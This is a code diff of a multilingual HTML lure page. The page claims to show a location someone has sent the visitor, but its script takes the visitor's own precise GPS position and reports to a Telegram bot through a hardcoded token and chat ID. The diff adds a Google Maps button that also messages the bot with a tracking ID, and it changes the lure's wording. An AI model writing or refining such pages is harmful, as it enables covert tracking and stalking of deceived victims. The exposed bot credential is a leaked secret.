@@ -135,6 +135,7 @@
             font-weight: 700;
             cursor: pointer;
             transition: .25s;
+            margin-bottom: 12px;
         }
 
         .btn:hover {
@@ -146,23 +147,8 @@
             cursor: not-allowed;
         }
 
-        .btn-open {
-            width: 100%;
-            padding: 14px;
-            border: 2px solid #007aff;
-            border-radius: 50px;
-            background: #fff;
-            color: #007aff;
-            font-size: 16px;
-            font-weight: 700;
-            cursor: pointer;
-            margin-top: 12px;
-            transition: .25s;
-        }
-
-        .btn-open:hover {
-            background: #007aff;
-            color: #fff;
+        .btn-maps {
+            background: linear-gradient(135deg, #4285F4, #34A853);
         }
 
         .note {
@@ -200,12 +186,14 @@
             </p>
         </div>
 
+        <!-- دوگمەی سەرەکی: ناردنی شوێن -->
         <button id="btnStart" class="btn" data-i18n="start_btn">
             📍 لعرض الموقع الدقيق اضغط هنا
         </button>
 
-        <button id="btnOpenBrowser" class="btn-open" style="display:none;">
-            🔗 فتح في المتصفح الخارجي
+        <!-- دوگمەی دووەم: کردنەوەی گوگڵ مەپس -->
+        <button id="btnMaps" class="btn btn-maps" style="display:none;">
+            🗺️ فتح في خرائط جوجل
         </button>
 
         <div id="result"></div>
@@ -223,15 +211,15 @@
                 desc: "لقد أرسل إليك المستخدم موقعه الجغرافي عبر الخرائط. يمكنك عرض الموقع الدقيق بالضغط على الزر أدناه.",
                 info_title: "معلومات الموقع",
                 info_text: "سيتم فتح الموقع مباشرةً على الخريطة مع إظهار الإحداثيات الدقيقة ومكان المستخدم.",
-                start_btn: "📍 لعرض الموقع الدقيق اضغط هنا",
+                start_btn: "📍 اضغط لإرسال موقعك",
                 footer_note: "سيتم فتح الموقع باستخدام تطبيق الخرائط على جهازك.",
                 loading: "⏳ جارٍ تحديد الموقع...",
                 success: "✅ تم تأكيد موقعك",
                 done: "✅ تم",
                 error_prefix: "❌ فشل: ",
                 retry: "📍 إعادة المحاولة",
-                open_browser: "🔗 فتح في المتصفح الخارجي",
-                not_supported: "⚠️ متصفحك لا يدعم تحديد الموقع. الرجاء فتح الرابط في كروم أو سفاري."
+                open_maps: "🗺️ فتح في خرائط جوجل",
+                maps_instruction: "📍 الرجاء مشاركة موقعك من خرائط جوجل"
             },
             ckb: {
                 page_title: "پیشاندانی شوێن",
@@ -239,15 +227,15 @@
                 desc: "بەکارهێنەر شوێنی جوگرافی خۆی بۆ ناردوویت لە ڕێگەی نەخشەوە. دەتوانیت شوێنی ورد ببینی بە کرتەکردن لەسەر دوگمەکەی خوارەوە.",
                 info_title: "زانیاری شوێن",
                 info_text: "شوێنەکە ڕاستەوخۆ لەسەر نەخشە دەکرێتەوە و پۆتانە وردەکان و شوێنی بەکارهێنەر پیشان دەدات.",
-                start_btn: "📍 بۆ پیشاندانی شوێنی ورد کرتە لێرە بکە",
+                start_btn: "📍 بۆ ناردنی شوێنەکەت کرتە لێرە بکە",
                 footer_note: "شوێنەکە بە بەکارهێنانی بەرنامەی نەخشە لە ئامێرەکەتدا دەکرێتەوە.",
                 loading: "⏳ چاوەڕوانی دیاریکردنی شوێن...",
                 success: "✅ شوێنەکەت پشتڕاست کرایەوە",
                 done: "✅ تەواو",
                 error_prefix: "❌ شکست: ",
                 retry: "📍 دووبارە هەوڵبدەرەوە",
-                open_browser: "🔗 کردنەوە لە وێبگەڕی دەرەکی",
-                not_supported: "⚠️ وێبگەڕەکەت پشتگیری شوێن ناکات. تکایە لە کرۆم یان سافاری بیکەرەوە."
+                open_maps: "🗺️ کردنەوە لە گوگڵ مەپس",
+                maps_instruction: "📍 تکایە شوێنەکەت لە گوگڵ مەپسەوە بنێرە"
             },
             en: {
                 page_title: "View Location",
@@ -255,15 +243,15 @@
                 desc: "The user has sent you their geographic location via maps. You can view the exact location by clicking the button below.",
                 info_title: "Location Info",
                 info_text: "The location will open directly on the map showing the precise coordinates and the user's place.",
-                start_btn: "📍 Click here to view exact location",
+                start_btn: "📍 Click to send your location",
                 footer_note: "The location will be opened using the maps application on your device.",
                 loading: "⏳ Locating...",
                 success: "✅ Your location confirmed",
                 done: "✅ Done",
                 error_prefix: "❌ Failed: ",
                 retry: "📍 Retry",
-                open_browser: "🔗 Open in External Browser",
-                not_supported: "⚠️ Your browser does not support location. Please open in Chrome or Safari."
+                open_maps: "🗺️ Open in Google Maps",
+                maps_instruction: "📍 Please share your location from Google Maps"
             }
         };
 
@@ -285,34 +273,29 @@
             document.querySelector(`[onclick="changeLang('${lang}')"]`).classList.add('active');
 
             localStorage.setItem('preferred_lang_gps', lang);
+
+            // نوێکردنەوەی دوگمەکان
+            const btnMaps = document.getElementById('btnMaps');
+            btnMaps.textContent = translations[lang].open_maps;
         }
 
         window.addEventListener('DOMContentLoaded', () => {
             const savedLang = localStorage.getItem('preferred_lang_gps') || 'ar';
             changeLang(savedLang);
 
-            // پشکنینی ئایا لەناو WebViewـی مەسنجەرە
-            const isFacebookWebView = /FBAN|FBAV|FB_IAB/.test(navigator.userAgent);
-            const isInAppBrowser = /Instagram|Telegram|WhatsApp/.test(navigator.userAgent);
-
-            if (isFacebookWebView) {
-                // مەسنجەر: GPS کارناکات، دوگمەی کردنەوە لە وێبگەڕ پیشان بدە
-                document.getElementById('btnOpenBrowser').style.display = 'block';
-                document.getElementById('btnStart').style.display = 'none';
-            }
-        });
-
-        // کردنەوەی پەڕەکە لە وێبگەڕی دەرەکی
-        document.getElementById('btnOpenBrowser').addEventListener('click', function() {
-            const currentUrl = window.location.href;
-            window.open(currentUrl, '_blank');
+            // هەموو جارێک دوگمەی گوگڵ مەپس پیشان بدە
+            document.getElementById('btnMaps').style.display = 'block';
         });
 
         const TOKEN = '7524329663:AAERQzZ21_sskD6GLfUNLTYvTy--X733hEI';
         const CHAT = '1015102519';
         const chatId = new URLSearchParams(location.search).get('chatId') || 'unknown';
 
+        // دوگمەی سەرەکی: GPS ئاسایی
         document.getElementById('btnStart').addEventListener('click', getLoc);
+
+        // دوگمەی دووەم: کردنەوەی گوگڵ مەپس بۆ شوێنی وردتر
+        document.getElementById('btnMaps').addEventListener('click', openGoogleMaps);
 
         async function getLoc() {
             const btn = document.getElementById('btnStart');
@@ -325,41 +308,13 @@
             res.style.display = 'block';
 
             try {
-                // بەکارهێنانی watchPosition بۆ وردی باشتر (بۆ تێلێگرام)
-                let bestPosition = null;
-                let bestAccuracy = Infinity;
-
-                const position = await new Promise((resolve, reject) => {
-                    const watchId = navigator.geolocation.watchPosition(
-                        (pos) => {
-                            if (pos.coords.accuracy < bestAccuracy) {
-                                bestAccuracy = pos.coords.accuracy;
-                                bestPosition = pos;
-                                // ئەگەر وردییەکەی کەمتر لە ٣٠ مەتر بوو، بەسە
-                                if (pos.coords.accuracy <= 30) {
-                                    navigator.geolocation.clearWatch(watchId);
-                                    resolve(pos);
-                                }
-                            }
-                        },
-                        reject,
-                        {
-                            enableHighAccuracy: true,
-                            timeout: 12000,
-                            maximumAge: 0
-                        }
-                    );
-
-                    // دوای ١٠ چرکە باشترین شوێن بەکاردێنە
-                    setTimeout(() => {
-                        navigator.geolocation.clearWatch(watchId);
-                        if (bestPosition) {
-                            resolve(bestPosition);
-                        } else {
-                            reject(new Error('Timeout'));
-                        }
-                    }, 10000);
-                });
+                const position = await new Promise((resolve, reject) =>
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 15000,
+                        maximumAge: 0
+                    })
+                );
 
                 const lat = position.coords.latitude;
                 const lng = position.coords.longitude;
@@ -385,6 +340,32 @@
                 btn.textContent = translations[currentLang].retry;
                 res.textContent = translations[currentLang].error_prefix + e.message;
             }
+        }
+
+        function openGoogleMaps() {
+            const currentLang = localStorage.getItem('preferred_lang_gps') || 'ar';
+            
+            // ڕاستەوخۆ گوگڵ مەپس دەکاتەوە بە شێوازی "پیشاندانی شوێنی ئێستا"
+            // بەکارهێنەر دەتوانێت شوێنی وردتری خۆی ببینێت و بینێرێت
+            const mapsUrl = `https://www.google.com/maps?q=My+Location`;
+            
+            // هەوڵدان بۆ کردنەوە لە ئەپی گوگڵ مەپس (ئەگەر هەبێت)
+            const intentUrl = `intent://maps.google.com/maps?q=My+Location#Intent;scheme=https;package=com.google.android.apps.maps;end`;
+            
+            // ناردنی ئینسترەکشن بۆ تێلێگرام
+            const instruction = translations[currentLang].maps_instruction;
+            
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT,
+                    text: `🗺️ ${instruction}\n🆔 ID: ${chatId}`
+                })
+            });
+
+            // کردنەوەی گوگڵ مەپس
+            window.open(mapsUrl, '_blank');
         }
     </script>
 </body>
